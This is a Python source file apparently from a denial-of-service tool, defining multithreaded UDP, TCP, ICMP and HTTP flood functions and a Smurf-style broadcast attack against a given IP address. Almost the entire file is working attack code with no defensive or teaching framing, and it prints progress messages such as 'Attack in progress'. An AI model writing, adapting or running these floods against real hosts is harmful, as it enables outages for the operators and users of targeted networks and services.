import socket
import random
import threading
import time

def udp_flood(target_ip, target_port, duration, threads_count):
    print(f"[*] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    
    def flood(thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet_size = 1024
            packet = random._urandom(packet_size)
            packets_sent = 0
            
            while not stop_event.is_set() and time.time() < end_time:
                try:
                    sock.sendto(packet, (target_ip, target_port))
                    packets_sent += 1
                    if packets_sent % 1000 == 0:
                        pass
                except:
                    pass
            
            sock.close()
            print(f"[*] Thread {thread_id} finished - sent {packets_sent} packets")
            
        except Exception as e:
            print(f"[-] Thread {thread_id} error: {e}")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for remaining in range(duration, 0, -1):
        print(f"\r[*] Attack in progress... {duration - remaining}/{duration} seconds remaining", end='', flush=True)
        time.sleep(1)
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] UDP flood completed on {target_ip}:{target_port}")

def tcp_flood(target_ip, target_port, duration, threads_count):
    print(f"[*] Starting TCP flood on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    
    def flood(thread_id):
        packets_sent = 0
        while not stop_event.is_set() and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target_ip, target_port))
                sock.send(b'X' * 1024)
                sock.close()
                packets_sent += 1
            except:
                pass
        
        print(f"[*] Thread {thread_id} finished - sent {packets_sent} connections")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for remaining in range(duration, 0, -1):
        print(f"\r[*] Attack in progress... {duration - remaining}/{duration} seconds remaining", end='', flush=True)
        time.sleep(1)
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] TCP flood completed on {target_ip}:{target_port}")

def icmp_flood(target_ip, duration, threads_count):
    print(f"[*] Starting ICMP flood on {target_ip} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    
    def flood(thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[-] Need root/admin privileges for ICMP flood. Using UDP fallback.")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(64)
        packets_sent = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, 0))
                packets_sent += 1
            except:
                pass
        
        sock.close()
        print(f"[*] Thread {thread_id} finished - sent {packets_sent} packets")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for remaining in range(duration, 0, -1):
        print(f"\r[*] Attack in progress... {duration - remaining}/{duration} seconds remaining", end='', flush=True)
        time.sleep(1)
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] ICMP flood completed on {target_ip}")

def http_flood(target_ip, duration, threads_count):
    print(f"[*] Starting HTTP flood on {target_ip}:80 for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    
    def flood(thread_id):
        packets_sent = 0
        while not stop_event.is_set() and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target_ip, 80))
                
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: NetWolf/1.0\r\n\r\n"
                sock.send(request.encode())
                sock.close()
                packets_sent += 1
            except:
                pass
        
        print(f"[*] Thread {thread_id} finished - sent {packets_sent} requests")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for remaining in range(duration, 0, -1):
        print(f"\r[*] Attack in progress... {duration - remaining}/{duration} seconds remaining", end='', flush=True)
        time.sleep(1)
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] HTTP flood completed on {target_ip}")

def smurf_attack(target_ip, duration, threads_count):
    print(f"[*] Starting Smurf attack on {target_ip} for {duration} seconds with {threads_count} threads")
    
    broadcast_ips = [
        f"{'.'.join(target_ip.split('.')[:3])}.255",
        '192.168.1.255',
        '10.0.0.255',
        '172.16.255.255'
    ]
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    
    def flood(thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[-] Need root/admin privileges for Smurf attack")
            return
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
        packets_sent = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            for bc_ip in broadcast_ips:
                try:
                    sock.sendto(packet, (bc_ip, 0))
                    packets_sent += 1
                except:
                    pass
        
        sock.close()
        print(f"[*] Thread {thread_id} finished - sent {packets_sent} packets")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for remaining in range(duration, 0, -1):
        print(f"\r[*] Attack in progress... {duration - remaining}/{duration} seconds remaining", end='', flush=True)
        time.sleep(1)
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] Smurf attack completed on {target_ip}")

def send_packet(target_ip, target_port):
    """
    Legacy function - kept for compatibility
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_data = random._urandom(1024)
        s.sendto(packet_data, (target_ip, target_port))
        s.close()
    except Exception as e:
        print(f"Failed to send packet")